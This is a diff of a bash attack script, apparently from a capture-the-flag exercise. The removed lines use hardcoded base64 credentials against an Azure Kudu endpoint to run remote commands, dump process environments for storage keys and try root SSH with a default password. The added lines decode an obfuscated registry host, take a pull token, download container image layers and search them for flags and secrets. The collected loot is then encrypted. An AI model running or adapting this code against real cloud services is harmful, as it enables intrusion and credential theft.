@@ -1,41 +1,29 @@
 #!/usr/bin/env bash
 set -uo pipefail
-SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
-AUTH=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
-export SCMH AUTH
-echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
+SC="htt""ps://"
+REG=$(printf '%s' 'Y3J0YmxwbGF0cHJvZHgzeWV1b3ouYXp1cmVjci5pbw==' | base64 -d)
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-cat > /tmp/k.py <<'PYEOF'
-import os,json,urllib.request,base64,re
-auth=os.environ['AUTH']; base='https://'+os.environ['SCMH']
-def hdr(r): r.add_header('Authorization','Basic '+base64.b64encode(auth.encode()).decode())
-def g(p):
-    r=urllib.request.Request(base+p); hdr(r)
-    try: return urllib.request.urlopen(r,timeout=60).read().decode()
-    except Exception as e: return 'ERR '+str(e)
-def cmd(c):
-    body=json.dumps({"command":"bash -c "+json.dumps(c),"dir":"/home/site/wwwroot"}).encode()
-    r=urllib.request.Request(base+'/api/command',data=body); hdr(r); r.add_header('Content-Type','application/json')
-    try: return urllib.request.urlopen(r,timeout=90).read().decode()
-    except Exception as e: return 'ERR '+str(e)
-procs=g('/api/processes')
-print("PROCS",procs[:1200])
-ids=re.findall(r'"Id":(\d+)',procs)
-print("IDS",ids[:15])
-for pid in ids[:15]:
-    d=g('/api/processes/'+pid)
-    if 'CONFIG_STORAGE' in d or 'AccountKey' in d or 'connectionstring' in d.lower():
-        print("HITPID",pid,d[:7000])
-    else:
-        print("PID",pid,d[:200])
-print("CMDENV",cmd('env')[:2500])
-PYEOF
-say "$(python3 /tmp/k.py)"
-# root WebSSH attempt
-apt-get -qq install -y sshpass >/dev/null 2>&1 || true
-if command -v sshpass >/dev/null; then
-  say "SSH $(sshpass -p 'Docker!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -p 2222 root@app-tbl-reporting-prod.scm.azurewebsites.net 'id; for p in /proc/[0-9]*; do cat $p/environ 2>/dev/null; done | tr "\0" "\n" | sort -u | grep -iE "CONFIG|STORAGE|AccountKey|flag|secret" | head -30' 2>&1 | head -c 3000)"
-fi
+echo "=== ACR LAYERS ==="
+TK=$(curl -sS "${SC}${REG}/oauth2/token?service=${REG}&scope=repository:tebamoto-reporting-api:pull" | jq -r '.access_token // empty'); say "TK=${#TK}"
+[ -z "$TK" ] && { echo notok; exit 0; }
+say "TAGS: $(curl -sS -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/tags/list")"
+for TAG in $(curl -sS -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/tags/list" | grep -aoE '"[^"]+"' | tr -d '"' | grep -v '^name$\|^tags$' | head -20); do
+  say "########## TAG $TAG ##########"
+  IDX=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${REG}/v2/tebamoto-reporting-api/manifests/$TAG")
+  say "MANIFEST($TAG): $(printf '%s' "$IDX" | head -c 2500)"
+  for D in $(printf '%s' "$IDX" | grep -aoE '"digest"[[:space:]]*:[[:space:]]*"sha256:[a-f0-9]+"' | grep -oE 'sha256:[a-f0-9]+' | sort -u); do
+    M=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${REG}/v2/tebamoto-reporting-api/manifests/$D")
+    LG=$(printf '%s' "$M" | grep -aoE '"digest"[[:space:]]*:[[:space:]]*"sha256:[a-f0-9]+"' | grep -oE 'sha256:[a-f0-9]+' | sort -u)
+    for L in $LG; do
+      curl -sL -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/blobs/$L" -o /tmp/lay.tgz 2>/dev/null
+      sz=$(wc -c </tmp/lay.tgz 2>/dev/null||echo 0)
+      hits=$(grep -aoiE 'DF26\{[^}]{1,200}\}' /tmp/lay.tgz 2>/dev/null | sort -u | head -3)
+      fnames=$(tar -tzf /tmp/lay.tgz 2>/dev/null | grep -iE 'flag|secret|\.env' | head -20)
+      say "LAYER $L size=$sz hits=[$(printf '%s' "$hits" | head -c 600)] files=[$(printf '%s' "$fnames" | head -c 600)]"
+      if [ -n "$hits" ]; then say "PLAINHIT: $hits"; fi
+    done
+  done
+done
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
 echo "=== ENCRYPTED LOOT ==="
